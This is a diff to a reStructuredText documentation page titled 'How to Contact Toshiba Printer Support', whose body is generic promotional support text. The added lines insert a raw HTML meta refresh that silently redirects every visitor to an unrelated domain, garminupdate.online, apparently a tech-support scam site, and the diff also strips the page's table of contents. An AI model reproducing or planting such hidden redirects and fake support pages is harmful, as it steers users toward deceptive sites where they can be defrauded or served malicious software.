@@ -1,10 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
 How to Contact Toshiba Printer Support? 😊
 ============================================
-.
 
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 Toshiba is a well-known name in the world of technology, offering a wide range of devices, including reliable and efficient printers. Whether you're using a Toshiba printer for personal tasks, academic work, or professional business needs, occasional issues can arise. When that happens, the first place you should turn is Toshiba printer support.
 
